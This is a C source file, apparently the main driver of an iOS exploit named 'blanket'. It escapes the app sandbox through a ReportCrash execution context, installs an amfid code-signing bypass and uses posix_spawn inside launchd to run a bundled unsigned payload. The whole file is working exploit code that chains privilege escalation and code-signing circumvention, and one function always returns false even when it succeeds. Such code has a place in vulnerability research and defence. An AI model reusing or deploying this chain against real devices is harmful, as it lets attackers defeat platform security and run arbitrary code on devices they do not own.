#include "blanket/main/blanket_main.h"

#include "blanket/amfid/amfid_codesign_bypass.h"
#include "blanket/log/log.h"
#include "blanket/sandbox_escape/sandbox_escape.h"
#include "blanket/sandbox_escape/threadexec_routines.h"

#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <spawn.h>
#include <sys/stat.h>

// Copy the path to the current bundle into a buffer.
static void
get_bundle_path(char *buffer, size_t size) {
	CFBundleRef bundle = CFBundleGetMainBundle();
	CFURLRef url = CFBundleCopyBundleURL(bundle);
	CFURLGetFileSystemRepresentation(url, true, (UInt8 *)buffer, size);
	CFRelease(url);
}

// Spawn the specified payload.
static bool
spawn_payload(threadexec_t priv_tx, const char *file) {
	bool success = false;
	// Build the path to the payload.
	char path[1024];
	get_bundle_path(path, sizeof(path));
	strlcat(path, "/", sizeof(path));
	strlcat(path, file, sizeof(path));
	// Chmod the payload so it is executable.
	int err;
	bool ok = threadexec_call_cv(priv_tx, &err, sizeof(err),
			chmod, 2,
			TX_CARG_CSTRING(const char *, path),
			TX_CARG_LITERAL(mode_t, 0755));
	if (!ok || err != 0) {
		ERROR("Could not make %s executable", file);
		goto fail_0;
	}
	// Create an execution context in launchd. We need launchd to be the parent process or the
	// child will get killed.
	threadexec_t launchd_tx = threadexec_init_with_threadexec_and_pid(priv_tx, 1);
	if (launchd_tx == NULL) {
		ERROR("Could not create execution context in launchd");
		goto fail_0;
	}
	// Build the argv and envp array in launchd.
	uint8_t *memory_r;
	uint8_t *memory_l;
	threadexec_shared_vm_default(launchd_tx,
			(const void **)&memory_r, (void **)&memory_l, NULL);
	char **argv_l = (void *)(memory_l);
	char **argv_r = (void *)(memory_r);
	char **envp_l = (void *)(memory_l + 0x100);
	char **envp_r = (void *)(memory_r + 0x100);
	char *path_l  = (void *)(memory_l + 0x200);
	char *path_r  = (void *)(memory_r + 0x200);
	strcpy(path_l, path);
	argv_l[0] = path_r;
	argv_l[1] = NULL;
	envp_l[0] = NULL;
	// Install the codesigning bypass to allow us to run unsigned code.
	ok = amfid_codesign_bypass_install(priv_tx);
	if (!ok) {
		ERROR("Could not install codesigning bypass");
		goto fail_1;
	}
	// Call posix_spawn() in launchd to spawn the payload.
	DEBUG_TRACE(1, "Spawning %s", path);
	pid_t pid;
	ok = threadexec_call_cv(launchd_tx, &err, sizeof(err),
			posix_spawn, 6,
			TX_CARG_PTR_LITERAL_OUT(pid_t *, &pid),
			TX_CARG_LITERAL(const char *, path_r),
			TX_CARG_LITERAL(void *, NULL),
			TX_CARG_LITERAL(void *, NULL),
			TX_CARG_LITERAL(void *, argv_r),
			TX_CARG_LITERAL(void *, envp_r));
	if (!ok || err != 0) {
		ERROR("Could not spawn %s: error %d", file, err);
		goto fail_2;
	}
	DEBUG_TRACE(1, "Spawned %s as PID %d", file, pid);
	success = true;
fail_2:
	amfid_codesign_bypass_remove();
fail_1:
	threadexec_deinit(launchd_tx);
fail_0:
	return false;
}

void
blanket_main() {
	DEBUG_TRACE(1, "%s", __func__);
	threadexec_t reportcrash_tx = sandbox_escape();
	if (reportcrash_tx == NULL) {
		goto fail;
	}
	spawn_payload(reportcrash_tx, "blanket_platform_payload");
	threadexec_deinit(reportcrash_tx);
fail:
	DEBUG_TRACE(1, "%s: done", __func__);
	exit(1);
}
